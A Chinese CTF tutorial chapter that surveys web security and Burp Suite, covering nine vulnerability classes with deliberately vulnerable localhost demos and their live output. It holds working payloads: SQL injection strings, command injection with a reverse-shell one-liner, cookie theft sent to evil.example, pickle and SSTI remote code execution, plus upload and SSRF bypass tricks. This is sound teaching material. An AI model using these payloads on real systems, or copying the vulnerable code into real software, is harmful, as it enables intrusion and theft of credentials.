---
chapter: 通用基础
section: Web 安全版图
order: 111
tags:
  - CTF
  - 通用基础
  - Web
  - Burp
publish: true
---

# 11 Web 安全版图与 Burp
## Web Security Overview & Burp Suite

> [!info]- 章节信息
> **所属方向**：通用基础 ｜ **难度阶段**：L1 入门期 ｜ **前置要求**：[[10-网络协议基础|10 网络协议基础]] · [[06-Python与CTF脚本基础|06 Python 与 CTF 脚本基础]]
> **本章目标**：拿到一张 Web 方向的"地图页"：CTF Web 题有哪几种形态、九类常见漏洞各自长什么样、手边该备哪些工具。每类漏洞都给最小可复现的演示，深度打法（盲注、绕 WAF、利用链构造）留给将来的 Web 方向库，这一章只管让你看见整张版图。

## 1. CTF Web 题长什么样

PWN 题发你一个二进制，逆向题发你一个更编译过的二进制，Web 题的形态就两种。

**形态一：靶机型。** 给一个 `ip:port`，浏览器或 curl 直接怼上去，题目页面就是一个网站：登录框、留言板、上传口、一段提示文字。没有源码，全靠黑盒：看指纹、猜路径、戳参数。CTF 比赛里的 Web 题九成是这个形态，==靶机题的真面目往往不在页面上，而在它的参数里==。

**形态二：源码审计型。** 直接发你一份源码附件（index.php、app.py 之类），让你白盒找漏洞。这种题页面上可能啥都没有，答案全在代码里：找出那段"看起来在鉴权、实际上在裸奔"的逻辑。

两种形态的终点一致：

==Web 题的终点几乎都是拿到 shell（getshell）或读到 flag 文件。==

flag 的常见藏身处：`/flag`、`/flag.txt`、Web 目录下、数据库某张表里、环境变量（`getenv('FLAG')`，云原生出题人最爱）。做 Web 题时脑子里始终挂着这个问题：**我现在的操作，离"读一个文件"还差几步？** 是直接读（命令注入/文件包含），还是先变成数据库用户再读（SQL 注入），还是先拿到代码执行（反序列化/SSTI）。

## 2. 工具链

HTTP 报文本身长什么样（请求行、头部、正文），[[10-网络协议基础|10 章]] 已经讲过，这里默认你认得。Web 工具链的核心就一句话：==能看到并改写请求，是一切 Web 测试的物理前提==。

### 2.1 Burp Suite：中间人本尊

Burp 是 Web 手的瑞士军刀，本质是一台**能改写 HTTP 报文的代理服务器**。浏览器把请求发给它，它转手发给靶机，响应原路返回，中间每一字节都归你改。三个最常用模块：

| 模块 | 干什么 |
| ---- | ---- |
| **Proxy** | 抓包。拦截浏览器与靶机之间的全部流量，逐条看、逐条放行 |
| **Repeater** | 改重放。把任意一条请求扔进去，改参数、点 Send、看响应，循环往复。Web 手 90% 的时间泡在这里 |
| **Intruder** | 爆破。把某个参数设成变量，挂上字典自动打：爆破口令、 fuzz 参数、枚举 ID |

装法：portswigger.net 下载 ，自带 Java，解压即跑。浏览器侧配代理插件 FoxyProxy 指到 `127.0.0.1:8080`；要抓 HTTPS 的话，开着代理访问 `http://burp` 下载 CA 证书，装进"受信任的根证书颁发机构"，装到"个人"目录里照样报红。

> [!note] Burp 的工作循环
> 抓到一条请求 → 右键 **Send to Repeater** → 改一个参数 → Send → 盯响应变化 → 再改。所谓"手工注入"，物理上就是这一个循环重复二十遍。本章后面所有手工利用，在真实靶机上都可以搬进 Repeater 里做。

### 2.2 浏览器 DevTools

F12 不是摆设。**Network 面板**看每个请求的方法、参数、响应头（`Server`、`X-Powered-By` 这两行经常直接告诉你后端是什么）；右键任意请求 **Copy as cURL**，拿到终端就能改了重放；**Console** 面板直接执行 JS。再配一个 hackbar 类插件，URL 编解码、快速构造 GET/POST 不用每次开 Burp。

### 2.3 一句话定位表

| 工具                   | 干什么         | 一句话                        |
| -------------------- | ----------- | -------------------------- |
| curl                 | 手搓 HTTP 请求  | 万物起点，[[06-Python与CTF脚本基础]] |
| dirsearch            | 目录爆破        | 字典怼路径，找隐藏页面和泄露文件           |
| sqlmap               | SQL 注入自动化   | 先手工确认注入点存在，再交给它去跑，别上来就梭    |
| GitHack / git-dumper | .git 泄露还原   | 见 3.1，把源码完整拖下来             |
| AntSword（中国蚁剑）       | webshell 管理 | 拿到 shell 之后的图形化文件管理器       |
| Burp Intruder        | 爆破          | 上面的活它也能干，就是慢（Community 限速） |

## 3. 九类漏洞版图

先上全景表，再逐个拆。每类统一四段：**原理**一句话 → **最小示例** → **手工利用** → **CTF 里长什么样**。

| # | 漏洞 | 一句话原理 | 典型入口 |
| ---- | ---- | ---- | ---- |
| 1 | 信息泄露 | 该藏的东西直接挂在 Web 根下 | robots.txt、.git、.bak |
| 2 | SQL 注入 | 输入拼进 SQL，改变了查询语义 | 登录框、搜索框 |
| 3 | 命令注入 | 输入拼进 shell 命令 | "ping 工具"的 IP 参数 |
| 4 | 文件包含 LFI | include 了用户可控的路径 | `?page=`、`?file=` |
| 5 | 文件上传 | 传上去的文件被当代码执行 | 头像上传、附件 |
| 6 | XSS | 输入被当成 HTML/JS 回显 | 评论框、`?name=` |
| 7 | SSRF | 服务器替你发请求 | `?url=` 预览、导入功能 |
| 8 | 反序列化 | 恢复对象时顺手执行了代码 | cookie、session |
| 9 | SSTI | 输入被当成模板语法编译 | 渲染页面的参数 |

### 3.1 信息泄露：flag 躺在你看得见的地方

**原理**：Web 服务器很乐意把文件给任何来要的人，包括不该被要到的那些。源码、配置、备份、版本库，忘在 Web 根目录就是白送。

最小实验，直接用 [[06-Python与CTF脚本基础|06 章]]的 Python 起一个带目录列表的站点（`python3 -m http.server` 默认就列目录），站点里放四样东西：

```
leak_site/
├── .git/HEAD
├── flag.txt
├── index.php.bak
└── robots.txt
```

**手工利用**（实测，Windows 侧 AdGuard 代理会往响应里塞私货，加 `--noproxy` 绕开）：

```bash
curl -s --noproxy '*' http://127.0.0.1:8083/ | grep -oE 'href="[^"]+"'
```

```
href=".git/"
href="flag.txt"
href="index.php.bak"
href="robots.txt"
```

目录列表一开，整个站点裸奔。逐个拿：

```bash
curl -s http://127.0.0.1:8083/robots.txt
curl -s http://127.0.0.1:8083/.git/HEAD
curl -s http://127.0.0.1:8083/index.php.bak
```

```
User-agent: *
Disallow: /admin
```
```
ref: refs/heads/main
```
```php
<?php
$flag = "flag{b4k_f1le_l34k}";
?>
```

三样各有说法：robots.txt 是网站写给爬虫的礼貌便条，==在 CTF 里就是出题人留下的藏宝图==，`Disallow` 的路径基本都要去摸一遍；`.git/HEAD` 说明整个版本库还挂在站点上，用 GitHack 或 git-dumper 能把历史提交里的源码全部还原，拿到源码黑盒题当场变白盒题；`index.php.bak` 是运维改文件时顺手留的备份，vim 崩溃留下的 `.index.php.swp`、macOS 的 `.DS_Store` 同理。

**CTF 里长什么样**：页面素得像 1998 年的静态站、题面一句提示都没有。先 dirsearch 扫一遍，再手工猜备份后缀（`.bak` `.swp` `.old` `~`），最后看 `.git`。

### 3.2 SQL 注入：一行输入改写一条查询

**原理**：==拼接 SQL 字符串的那一刻，用户输入就从"数据"变成了"代码"==。登录逻辑写成下面这样（Python + sqlite3，内存库，PHP/Java 里一模一样的写法一抓一大把）：

```python
import sqlite3

con = sqlite3.connect(":memory:")
cur = con.cursor()
cur.execute("CREATE TABLE users(id INTEGER PRIMARY KEY, user TEXT, pass TEXT)")
cur.executemany("INSERT INTO users(user, pass) VALUES (?, ?)",
                [("admin", "s3cr3t_pw"), ("guest", "guest123")])

def login(user, pw):
    # 漏洞代码：输入直接拼进 SQL
    sql = "SELECT * FROM users WHERE user='" + user + "' AND pass='" + pw + "'"
    print("[发送给数据库的 SQL]", sql)
    return cur.execute(sql).fetchall()
```

**手工利用**（实测，三连）：

```
=== 1. 正常登录（密码错误）===
[发送给数据库的 SQL] SELECT * FROM users WHERE user='admin' AND pass='wrong_password'
[查询结果] []

=== 2. 万能密码：' or 1=1-- ===
[发送给数据库的 SQL] SELECT * FROM users WHERE user='' or 1=1-- ' AND pass='anything'
[查询结果] [(1, 'admin', 's3cr3t_pw'), (2, 'guest', 'guest123')]

=== 3. 只知道用户名：admin'-- ===
[发送给数据库的 SQL] SELECT * FROM users WHERE user='admin'-- ' AND pass='anything'
[查询结果] [(1, 'admin', 's3cr3t_pw')]
```

第 2 个 payload 逐 token 拆开看：

| 片段 | 干的事 |
| ---- | ---- |
| `'` | 闭掉 `user='` 的前半个引号，从此你写的就是 SQL 语法了 |
| ` or 1=1` | 给 WHERE 加一个恒真条件，语义从"找这个人"变成"找所有人" |
| `-- ` | SQL 注释符，把后面那段 `AND pass='anything'` 直接蒸发 |

于是查询条件恒真，全表返回，"登录成功"。第 3 个更省事：`admin'-- ` 直接把密码校验整个注释掉。修法也顺带看到了：**参数化查询**（`?` 占位符），让输入永远只当数据。

真实 MySQL 环境里还有更多玩法：`UNION SELECT` 把 flag 表拼进正常回显、报错注入用 `extractvalue` 把数据挤进报错信息、盲注靠页面真假或 `sleep(5)` 一位一位猜。sqlmap 在确认注入点后接手：`sqlmap -u "http://x/?user=1" -p user --dump`。

**CTF 里长什么样**：一切能填东西的框。有回显就 union，没回显就盲注，登录框先试万能密码。练这块别直接上赛题，去 sqli-labs 把 union 玩熟（见第 7 节）。

### 3.3 命令注入：shell 元字符全归你使唤

**原理**：服务器把你的输入拼进一条 shell 命令去执行。shell 本来就认 `;` `&&` `|` 这些元字符，你拼进去的每个字符都会被 shell 忠实执行。

最小示例，一个漏洞版"在线 ping 工具"，http.server + subprocess：

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import subprocess

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        u = urlparse(self.path)
        if u.path != "/ping":
            self.send_response(404); self.end_headers(); return
        host = parse_qs(u.query).get("host", ["127.0.0.1"])[0]
        cmd = "ping -c 1 -W 1 " + host          # 漏洞点：拼接进 shell
        out = subprocess.run(cmd, shell=True,
                             capture_output=True, text=True, timeout=5)
        data = ("[exec] " + cmd + "\n" + out.stdout + out.stderr).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

HTTPServer(("127.0.0.1", 8081), Handler).serve_forever()
```

**手工利用**（实测。同目录放一个 `flag.txt` 内容为 `flag{c0mm4nd_1nj3ct10n}`，URL 里的 `%3B` 和 `%20` 是 `;` 和空格的 URL 编码）：

```bash
curl -s 'http://127.0.0.1:8081/ping?host=127.0.0.1'
curl -s 'http://127.0.0.1:8081/ping?host=127.0.0.1%3Bcat%20flag.txt'
```

```
[exec] ping -c 1 -W 1 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.132 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```

```
[exec] ping -c 1 -W 1 127.0.0.1;cat flag.txt
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.058 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
flag{c0mm4nd_1nj3ct10n}
```

`;cat flag.txt` 跟在 ping 后面被 shell 顺序执行，flag 直接拼在响应里回出来了。换个分隔符就是换个姿势：`&&` 前面成功才执行、`||` 前面失败才执行、`|` 管道接走 stdout、`$(cmd)` 和反引号是子命令、换行符也行。空格被过滤时 `${IFS}` 顶上；`cat` 被过滤时 `ca''t`、`/bin/c?t`、`base64 flag` 轮流上阵。

**CTF 里长什么样**：页面叫"在线 ping""DNS 查询""网络诊断"，输入框只让你填 IP 或域名。这类题是 ==getshell 直通车==：确认能执行后直接 `;bash -c 'bash -i >& /dev/tcp/ip/port 0>&1'` 反弹 shell，或者最起码 `;ls /;cat /flag`。

### 3.4 文件包含 LFI：路径你说了算

**原理**：`include`/`require` 的文件路径来自用户输入，服务器就把那个路径的文件**当 PHP 代码执行**或当内容输出。

```php
<?php
// vulnerable.php
include($_GET['page'] . '.php');   // 页面路由的常见写法
```

**手工利用**：`?page=../../../../etc/passwd` 让 include 顺着相对路径爬出 Web 目录读到系统文件。`../` 层数不够就多打几个，总会溢出到根。尾部拼了 `.php` 不怕，Linux 下 `passwd` 后面缀啥都还是 `passwd`（Windows 同理会报错）。更狠的是伪协议：

```
?page=php://filter/read=convert.base64-encode/resource=index
```

把 index.php 源码 base64 后当"文件内容"吐出来。LFI 在 CTF 里的高频用法就是**读源码**，读完源码再打第二层漏洞。

**CTF 里长什么样**：URL 里出现 `?page=about`、`?file=login`、`?module=main`，先把 `../../../../etc/passwd` 试试探深度，再上 `php://filter` 读源码，最后才是日志投毒、session 文件包含这些 getshell 链（Web 方向库的事）。

### 3.5 文件上传：传上去的就是 shell

**原理**：文件上传漏洞 = **能传上去 + 知道路径 + 能被解析执行**，三缺一都白搭。出题人的防御是黑白名单，你的工作是绕过它。

```php
<?php
// 黑名单版：名字带 .php 就拒
$ext = pathinfo($_FILES['f']['name'], PATHINFO_EXTENSION);
if (in_array(strtolower($ext), ["php"])) die("no");
move_uploaded_file($_FILES['f']['tmp_name'], "uploads/" . $_FILES['f']['name']);
```

**绕过思路速查**：

| 防御 | 绕法 |
| ---- | ---- |
| 黑名单禁 .php | `.php5` `.phtml` `.phar` `.pht`、大小写 `.PhP`、尾缀点/空格（Windows 折叠） |
| 白名单只留图片 | `%00` 截断（PHP < 5.3.4）、MIME 改 `image/jpeg`（Content-Type 是请求头，服务端没验内容就骗得过）、图片马（真图片尾部粘 PHP 代码）+ 文件包含配合解析 |
| 内容检测（文件头） | `GIF89a` 开头 + 图片马；`getimagesize()` 只认头几十字节 |
| 没有 | 传 `.htaccess` 让 Apache 把 .jpg 当 PHP 跑 |

**CTF 里长什么样**：头像上传、附件上传。传完页面会告诉你路径（`uploads/xxx.php`），拿蚁剑一连就是 shell。upload-labs 靶场 21 关就是把上面这张表挨个练一遍。

### 3.6 XSS：浏览器把你的字符串当代码

**原理**：用户输入没转义就进了 HTML 页面，浏览器分不清哪段是页面哪段是你塞的脚本，统统执行。分三型：**反射型**（脚本在请求里，随响应立刻回显）、**存储型**（落进数据库，每个访问者都中招）、**DOM 型**（前端 JS 自己把输入拼进 DOM）。

最小示例，把 `?name=` 原样嵌进 HTML 的服务（实测）：

```python
name = parse_qs(u.query).get("name", ["guest"])[0]   # 未转义直接嵌入
html = "<html><body><h1>Hello, " + name + "!</h1></body></html>"
```

```bash
curl -s --noproxy '*' 'http://127.0.0.1:8082/?name=%3Cscript%3Ealert(document.cookie)%3C/script%3E'
```

```
<html><body><h1>Hello, <script>alert(document.cookie)</script>!</h1></body></html>
```

curl 不执行 JS，但注入位置看得清清楚楚，换成真浏览器访问这个 URL，alert 当场就弹。危害从来不是弹框自嗨，是**偷 cookie**：

```html
<script>document.location='http://evil.example/?c='+document.cookie</script>
```

**CTF 里长什么样**：题目带一个"机器人"，会以管理员身份定时访问你提交的 URL，目标就是把 bot 的 cookie（里面常有真 flag）送出来。存储型 XSS 在留言板题里打全场，反射型配 bot 打定点。自己练可以去 XSS 挑战平台关卡通关。

### 3.7 SSRF：服务器有内网通行证，而它听你的

**原理**：==SSRF 的本质是借刀：服务器能访问内网，而服务器去哪由你的参数决定==。典型场景是"URL 预览"功能，你给个链接，服务器替你抓回来展示。

最小示例两台服务器（实测）：`9001` 端口是只绑 `127.0.0.1` 的"内网管理后台"，外网根本摸不到；`9000` 端口是预览服务，`/preview?url=` 参数没做任何限制：

```python
url = parse_qs(u.query).get("url", [""])[0]     # 漏洞点：url 不限制
body = urllib.request.urlopen(url, timeout=3).read().decode()
```

```bash
curl -s --noproxy '*' 'http://127.0.0.1:9000/preview?url=http://127.0.0.1:9001/admin'
```

```
<h1>URL 预览服务</h1><pre>INTERNAL ADMIN PANEL
super_secret_flag{ssrf_reached_intranet}</pre>
```

预览服务替你转发了这次请求，内网面板的内容原样吐给了站在外网的你。真实的危害更大：云主机的元数据服务 `http://169.254.169.254` 里躺着主机凭据，`file:///etc/passwd` 让 urllib 直接读本地文件。

**CTF 里长什么样**：网页预览、RSS 导入、"通过 URL 上传图片"。过滤了 `127.0.0.1` 就换写法：`0x7f000001`、`2130706433`、`0177.0.0.1` 都是它；禁了 http 协议就换 `file://`、`gopher://`（gopher 能伪造任意 TCP 报文，打内网 Redis 是经典连招）。

### 3.8 反序列化：恢复对象的那一行就是执行点

**原理**：序列化把对象变成字节流，反序列化把字节流恢复成对象，恢复过程会**调用魔术方法**。字节流你可控，等于调用链你可控。Python 的 pickle 是最直白的版本：`__reduce__` 返回什么，`loads()` 就执行什么。

最小示例（实测，全程不需要网络，cookie 里塞 base64 的 pickle 就是真实世界的形态）：

```python
import base64, os, pickle, pickletools

class Exploit:
    def __reduce__(self):
        return os.system, ("cat flag.txt",)   # loads() 会"恢复"出这次调用

blob = pickle.dumps(Exploit())
token = base64.b64encode(blob).decode()       # 攻击者把它塞进 cookie
pickletools.dis(blob)                          # 看看字节流里到底写了啥

pickle.loads(base64.b64decode(token))          # 服务端：这一行就是执行点
```

实测输出（token 和字节码部分）：

```
[*] 恶意 token: gAWVJwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAxjYXQgZmxhZy50eHSUhZRSlC4=
[*] pickle 字节码（人话版）:
    0: \x80 PROTO      5
   11: \x8c SHORT_BINUNICODE 'posix'
   19: \x8c SHORT_BINUNICODE 'system'
   28: \x93 STACK_GLOBAL
   30: \x8c SHORT_BINUNICODE 'cat flag.txt'
   45: \x85 TUPLE1
   47: R    REDUCE
```

字节码自己会说话：`posix`、`system`、`cat flag.txt` 三根字符串加一条 `REDUCE`。所谓"反序列化漏洞"，payload 里明晃晃写着要执行的命令。`loads` 跑完：

```
[*] 服务端 pickle.loads(token) 的结果:
flag{p1ckle_rce_1s_c4ndy}
```

==反序列化和 eval 是一家：把"数据"交给会执行代码的函数，出事只是时间问题==。Python 之外，PHP 的 `unserialize()`（绕 `__wakeup` 是 CTF 保留节目）和 Java 的反序列化（Shiro、fastjson，配合 CC 链）是另外两大赛区，套路一致：认出序列化数据 → 构造利用链。

**CTF 里长什么样**：cookie 或请求体里一坨 base64，解开开头是 `O:4:"User":1:`，PHP 序列化格式，直接开整。

### 3.9 SSTI：模板引擎把输入当语法编译了

**原理**：服务端渲染时模板引擎会解析 `{{ }}`。如果用户输入被拼进模板字符串再渲染，你写的 `{{ }}` 就不是文本，是代码。（Flask 没装，直接用 jinja2 原生接口复现，`Template(字符串).render()` 这个写法本身就是漏洞。实测。）

```python
from jinja2 import Template

def render(name):
    # 漏洞写法：用户输入进了模板字符串
    return Template("<h2>Hello " + name + "!</h2>").render()
```

**手工利用**（实测）：先探测：

```
=== 1. 数学探测：{{7*7}} ===
<h2>Hello 49!</h2>
```

页面上出现 49 而不是字面量 `{{7*7}}`，模板注入石锤。再加一发 `{{7*'7'}}`：jinja2 返回 `7777777`（字符串乘法），Twig 返回 `49`（数值运算），顺带把引擎也认了。然后直取 flag：

```
=== 2. 更进一步：读 flag ===
[payload] {{ lipsum.__globals__['os'].popen('cat flag.txt').read() }}
<h2>Hello flag{ssti_t3mpl4t3_pwn3d}!</h2>
```

`lipsum` 是 jinja2 模板里自带的函数，`.__globals__` 顺手把 jinja2 模块的全局命名空间掀开，里面有 `os`，`popen` 执行命令，payload 一条链走完"从模板到 shell"。更通用的 `__class__.__mro__` 链、各类引擎（Twig、Velocity、Thymeleaf）的 payload 表，留给 Web 方向库。

**CTF 里长什么样**：页面上大字渲染着你提交的内容（"Hello {你的名字}"）、报错页露出 Werkzeug 字样。先 `{{7*7}}` 探测，中了再按引擎选 payload。

## 4. 语言特性即考点

==CTF Web 的一半考点不是漏洞，是语言怪癖==。出题人写一段"看似判断得很严"的代码，你需要用这门语言自己的糊涂账把它绕过去。PHP 是重灾区，Python 和 JS 各有贡献。

### 4.1 PHP 弱类型比较

`==` 是"大概像就行"，`===` 才是严格比较。经典题：**魔法哈希**。先用 Python 真算两个 MD5：

```
md5('240610708') = 0e462097431906509019562988736854
md5('QNKCDZO')   = 0e830400451993494058024219903391
```

都是 `0e` 开头、后面全数字。PHP 把这种字符串当**科学计数法的浮点数 0** 解析，于是：

```php
// "0e462..." == "0e830..." → 0 == 0 → true（PHP 弱比较）
if ((string)$_GET['a'] !== (string)$_GET['b'] && md5($_GET['a']) == md5($_GET['b']))
    echo $flag;
```

两个不相等的字符串，MD5 却"相等"，flag 到手。同一族考点还有：`"php" == 0` 在 PHP 7 为 true（字符串转数字得 0；PHP 8 改了规则，先看题面版本）；传数组让 `md5()` 报 warning 返回 NULL，`NULL == NULL` 又成立；JSON body 里 `{"a": true}` 和任意字符串弱比较也为 true。出题人的防御逻辑写在这些坑上，绕它只需要知道坑在哪。

### 4.2 Python 的坑

pickle 见过 3.8。另一个是**格式化字符串**：`fmt` 内容可控时，`"{0.__class__}".format(x)` 能顺着属性一路摸到对象内部乃至全局命名空间，本质和 SSTI 是同一件事的轻量版：格式串成了代码。审 Python 源码题时盯住 `format(`、`pickle.loads(`、`eval(`、`exec(` 这几个入口。

### 4.3 JS 原型链污染一瞥

```javascript
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') merge(target[key], source[key]);
        else target[key] = source[key];   // key = "__proto__" 时……
    }
}
```

递归 merge 不检查 `__proto__` 这个 key，你提交 `{"__proto__": {"admin": true}}`，所有对象的 `admin` 从此都是 true，权限判断 `if (user.admin)` 集体沦陷。Node 题、前端题的高频考点，第一眼认出"递归 merge"三个字就够了。

## 5. 打题流程：拿到题先看什么

靶机到手，按这个顺序过一遍，前三步一分钟能跑完：

1. **F12**：源码里翻注释（出题人爱藏提示），Network 面板看响应头，`Server`、`X-Powered-By` 直接报后端指纹。
2. **顺手四连**：`/robots.txt`、`/.git/HEAD`、`/index.php.bak`、`/flag.txt`，成本为零，中了血赚（见 3.1）。
3. **dirsearch** 扫目录，找隐藏页面和后台。
4. **找输入点**：所有 GET/POST 参数、cookie、上传口，甚至 User-Agent 和 Referer，有输入的地方就有注入的候选。
5. **对号入座**：语言/框架/中间件认出来了，翻第 3 节的版图表，把对应的招挨个试。
6. **都不是**：题目八成是源码审计型，去要附件。

> [!warning] 先手工，后工具
> sqlmap 和 dirsearch 是放大器，不是探测器：注入点是否存在、是哪种注入、回显在哪，得你先手工判断，工具只负责把重复劳动自动化。上来就梭工具，梭完一无所获还以为"这题没洞"，是新手最常见的死法。靶场也一样，==先手工试一遍，再用工具复现==，顺序反了什么都学不到。

靶场路线（[[01-Linux环境与CTF实验环境搭建|01 章]]的 docker 直接拉起来）：

- **sqli-labs**：SQL 注入专精，Less-1 到 Less-75，union 和盲注的驾校
- **upload-labs**：文件上传专精，21 关全是绕过思路
- **pikachu**：漏洞大杂烩，难度温和，适合第一站
- **DVWA**：老牌综合平台，安全等级 Low→High 可调，能看"修好长什么样"
- **CTFshow Web 入门**：真 CTF 题味的入门题集，web1 开始一题一题啃
- **BUUCTF Web 区**：历年赛题库，打完入门就来这见世面

## 6. 常见问题

| 现象 | 原因与解决 |
| ---- | ---------- |
| Burp 抓不到浏览器的包 | 代理没指对：确认 FoxyProxy 指向 `127.0.0.1:8080`，且 Burp 的 Proxy 处于 Intercept on 或已转发 |
| 证书装了 HTTPS 还是报红 | 证书装错位置：必须装进"受信任的根证书颁发机构"，装到"个人"里没用 |
| Repeater 重放返回和抓包时不一样 | 很多站校验 Cookie/CSRF/时间戳，把整条请求原样带上；session 过期就重新抓一条 |
| payload 明明正确却不生效 | 先查编码：空格 `%20`、`#` 会截断 URL、`&` 会截断参数；JSON body 里的引号要转义 |
| curl 里的 `;` `&` 把命令搞乱了 | URL 没加引号，shell 抢先解析了元字符；URL 一律单引号包住 |
| 响应里多出你没写的 `<script>` | 本机代理软件（AdGuard/mihomo 之类）在中间改了响应（本章实测时就中过招）：curl 加 `--noproxy '*'` 或关掉代理复测 |
| WSL 里起的服务 Windows 浏览器访问不了 | 服务绑了 `127.0.0.1` 时只在 WSL 内可见；WSL2 通常有 localhost 转发，不行就用 WSL 的 IP，或让服务绑 `0.0.0.0` |
| dirsearch 全是 403/429 | 线程太猛被拦：`-t 1` 降速，`-H "User-Agent: ..."` 换正常 UA |
| sqlmap 跑半天说没注入 | 你以为的注入点可能真没有，或需要 cookie/POST 才能到：先手工确认 payload 能改变响应，再 `--level 3 --risk 2` 加火力 |
| 靶场容器起不来 | `docker ps -a` 看状态、`docker logs` 看报错；端口占用换映射端口，PHP 版本不匹配换镜像 tag |
| SSTI payload 打不出 49 | 输入可能被转义或拼进了属性而非模板体：F12 看渲染结果里 `{{7*7}}` 是原样出现还是消失，原样出现说明根本没进模板 |

